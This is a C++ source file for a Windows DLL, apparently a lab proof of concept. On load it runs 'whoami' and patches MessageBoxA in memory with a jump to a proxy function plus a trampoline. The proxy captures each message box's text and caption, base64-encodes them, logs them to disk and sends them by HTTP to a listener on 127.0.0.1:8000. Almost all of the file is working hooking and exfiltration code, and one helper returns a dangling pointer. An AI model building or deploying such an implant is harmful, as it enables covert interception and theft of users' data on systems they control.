// dllmain.cpp : Defines the entry point for the DLL application.
#include <cstdlib>
#include <windows.h>
#include <iostream>
#include <stdio.h>
#include <fstream>
#include "base64.hpp"
#include <string>
#include <sstream>
#include <iomanip>
#include <winhttp.h>

#pragma comment (lib, "user32.lib")
#pragma comment(lib, "winhttp.lib")

int makeRequest(std::wstring queryWstring) {

    std::wstring queryFullWstring = L"/?asd=" + queryWstring;
    LPCWSTR queryFullLPCWSTR = queryFullWstring.c_str();

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,

        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, L"127.0.0.1",
            8000, 0);

        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", queryFullLPCWSTR,
                NULL, WINHTTP_NO_REFERER,
                WINHTTP_DEFAULT_ACCEPT_TYPES,
                0);

            if (hRequest) {
                BOOL bResults = WinHttpSendRequest(hRequest,
                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                    WINHTTP_NO_REQUEST_DATA, 0,
                    0, 0);

                if (bResults) {
                    bResults = WinHttpReceiveResponse(hRequest, NULL);
                }

                if (bResults) {
                    DWORD dwSize = 0;
                    WinHttpQueryDataAvailable(hRequest, &dwSize);

                    if (dwSize > 0) {
                        char* pszOutBuffer = new char[dwSize + 1];
                        ZeroMemory(pszOutBuffer, dwSize + 1);

                        DWORD dwDownloaded = 0;
                        WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);

                        std::cout << pszOutBuffer << std::endl;
                        delete[] pszOutBuffer;
                    }
                }

                WinHttpCloseHandle(hRequest);
            }

            WinHttpCloseHandle(hConnect);
        }

        WinHttpCloseHandle(hSession);
    }

    return 0;
}

LPCWSTR convertStringToWide(std::string inputString) {
    std::wstring wstr(inputString.begin(), inputString.end());
    return wstr.c_str();
}

std::string urlEncode(const std::string& value) {
    std::ostringstream encoded;
    for (char c : value) {
        if (c == '+') {
            encoded << "%2B";
        }
        else if (c == '/') {
            encoded << "%2F";
        }
        else if (c == '=') {
            encoded << "%3D";
        }
        else {
            encoded << c;
        }
    }
    return encoded.str();
}

typedef int (WINAPI* trampDef)(HWND hWnd, LPCSTR  lpText, LPCSTR  lpCaption, UINT uType);
LPVOID tramp_add;

// The proxy function we will jump to after the hook has been installed
int __stdcall proxy_function(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
{
    system("whoami > C:\\test\\worked2.txt");
    std::ofstream file("C:\\test\\data.txt", std::ios::app);
    std::string textStr(lpText);
    std::string captionStr(lpCaption);
    // pass to the tramp with altered arguments which will then return to MessageBoxA
    trampDef tramp = (trampDef)tramp_add;
    file << urlEncode(base64::to_base64(textStr + ":" + captionStr)) << std::endl;
    file.close();
    makeRequest(convertStringToWide(urlEncode(base64::to_base64(textStr + ":" + captionStr))));
    return tramp(hWnd, lpText, lpCaption, uType);
}

void hook_it()
{
    HINSTANCE hinstLib;
    VOID* proxy_address;
    DWORD* relative_offset;
    DWORD* hook_address;
    DWORD src;
    DWORD dst;
    BYTE patch[5] = { 0 };
    BYTE saved_buffer[5]; // buffer to save the original bytes
    FARPROC function_address = NULL;

    // 1. get memory address of the MessageBoxA function from user32.dll 
    hinstLib = LoadLibrary(L"user32.dll");
    function_address = GetProcAddress(hinstLib, "MessageBoxA");

    // 2. save the first 5 bytes into saved_buffer
    ReadProcessMemory(GetCurrentProcess(), function_address, saved_buffer, 5, NULL);

    // 3. overwrite the first 5 bytes with a jump to proxy_function
    proxy_address = &proxy_function;
    src = (DWORD)function_address + 5;
    dst = (DWORD)proxy_address;
    relative_offset = (DWORD*)(dst - src);

    memcpy(patch, "\xE9", 1);
    memcpy(patch + 1, &relative_offset, 4);

    WriteProcessMemory(GetCurrentProcess(), (LPVOID)function_address, patch, 5, NULL);

    // 4. Build the tramp
    tramp_add = VirtualAlloc(NULL, 11, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    hook_address = (DWORD*)((DWORD)function_address + 5);

    memcpy((BYTE*)tramp_add, &saved_buffer, 5);
    memcpy((BYTE*)tramp_add + 5, "\x68", 1);
    memcpy((BYTE*)tramp_add + 6, &hook_address, 4);
    memcpy((BYTE*)tramp_add + 10, "\xC3", 1);

}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        system("whoami > C:\\test\\worked1.txt");
        hook_it();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

